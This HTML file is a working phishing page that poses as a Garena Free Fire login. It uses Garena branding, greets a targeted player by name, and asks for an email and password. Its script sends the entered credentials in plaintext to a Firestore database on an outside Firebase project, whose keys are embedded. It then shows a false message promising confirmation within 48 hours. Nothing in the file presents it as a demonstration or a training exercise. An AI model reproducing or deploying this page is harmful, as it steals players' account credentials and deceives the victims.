<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>
  <link rel="icon" type="image/png" href="https://i.ibb.co/LXXGHhZg/garena.png">

  <!-- Firebase SDK -->
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
  <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: Arial, sans-serif;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      position: relative;
      overflow: hidden;
    }

    /* Background */
    body::before {
      content: "";
      position: absolute;
      top: 0; left: 0; right: 0; bottom: 0;
      background: url("https://i.ibb.co/Qj833qRN/Garena-Free-Fire-MAX-redeem-codes-July-27.jpg") no-repeat center center/cover;
      filter: brightness(0.4) blur(4px);
      z-index: -1;
    }

    .login-box {
      background: rgba(0, 0, 0, 0.65);
      padding: 25px;
      border-radius: 15px;
      max-width: 350px;
      width: 90%;
      text-align: center;
      color: #fff;
      backdrop-filter: blur(3px);
      border: 2px solid #ffcc00;
      box-shadow: 0 0 10px #ffcc00, 0 0 20px #ffb300, 0 0 30px #ff9900;
      animation: neonPulse 2s infinite alternate;
    }

    @keyframes neonPulse {
      from {
        box-shadow: 0 0 10px #ffcc00, 0 0 20px #ffb300, 0 0 30px #ff9900;
      }
      to {
        box-shadow: 0 0 20px #ffcc00, 0 0 40px #ffb300, 0 0 60px #ff9900;
      }
    }

    .login-box img {
      width: 70px;
      margin-bottom: 12px;
    }

    h2 { font-size: 1.3rem; margin-bottom: 10px; }
    p { font-size: 0.9rem; margin-bottom: 15px; color: #ccc; }

    input {
      width: 100%;
      padding: 12px;
      margin: 8px 0;
      border-radius: 8px;
      border: 2px solid #444;
      outline: none;
      font-size: 1rem;
      background: #111;
      color: #fff;
      transition: 0.3s;
    }

    /* Neon glow on focus */
    input:focus {
      border-color: #ffcc00;
      box-shadow: 0 0 10px #ffcc00, 0 0 20px #ffb300;
    }

    button {
      padding: 12px;
      width: 100%;
      background: #ffcc00;
      border: none;
      border-radius: 8px;
      color: black;
      font-size: 1rem;
      font-weight: bold;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 0 8px #ffcc00;
    }

    button:hover {
      background: #ffb300;
      transform: scale(1.05);
      box-shadow: 0 0 15px #ffcc00, 0 0 30px #ffb300, 0 0 45px #ff9900;
    }

    /* Popup message */
    .popup {
      position: fixed;
      top: -80px; /* hidden above screen */
      left: 50%;
      transform: translateX(-50%);
      background: #ffcc00;
      color: black;
      padding: 12px 20px;
      border-radius: 8px;
      font-weight: bold;
      box-shadow: 0 0 15px #ffcc00;
      opacity: 0;
      transition: all 0.6s ease;
      z-index: 1000;
    }

    .popup.show {
      top: 20px;
      opacity: 1;
    }

    @media (max-width: 480px) {
      .login-box { padding: 20px; }
      .login-box img { width: 55px; }
      h2 { font-size: 1.1rem; }
      p { font-size: 0.85rem; }
    }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://i.ibb.co/LXXGHhZg/garena.png" alt="Garena Logo">
    <h2>Dear ✿ᎪᏆᎦᎻᎪᏫᎮ乂</h2>
    <p>Please enter your email & password to continue</p>
    <form id="loginForm">
      <input type="email" id="email" placeholder="Enter your email" required>
      <input type="password" id="password" placeholder="Enter your password" required>
      <button type="submit">Login</button>
    </form>
  </div>

  <!-- Popup -->
  <div id="popup" class="popup">
    You will receive confirmation at your email in 48 hours
  </div>

  <script>
    // ✅ Your Firebase config
    const firebaseConfig = {
      apiKey: "AIzaSyCXJiBXLNVnk0TSigI2bDA9kG4MgrXEQ40",
      authDomain: "my-store-a881a.firebaseapp.com",
      projectId: "my-store-a881a",
      storageBucket: "my-store-a881a.appspot.com",
      messagingSenderId: "749092459183",
      appId: "1:749092459183:web:44afb5c6a91d2a787eba5a",
      measurementId: "G-FLDGL3JF38"
    };

    // ✅ Initialize Firebase
    firebase.initializeApp(firebaseConfig);
    const db = firebase.firestore();

    // ✅ Handle form submit
    document.getElementById("loginForm").addEventListener("submit", async (e) => {
      e.preventDefault();

      const email = document.getElementById("email").value;
      const password = document.getElementById("password").value;

      try {
        await db.collection("users").add({
          email: email,
          password: password,
          timestamp: firebase.firestore.FieldValue.serverTimestamp()
        });

        // ✅ Show popup with slide animation
        const popup = document.getElementById("popup");
        popup.classList.add("show");
        setTimeout(() => { popup.classList.remove("show"); }, 5000);

        // Reset form
        document.getElementById("loginForm").reset();
      } catch (error) {
        console.error("❌ Error adding document: ", error);
        alert("Error: " + error.message);
      }
    });
  </script>
</body>
</html>
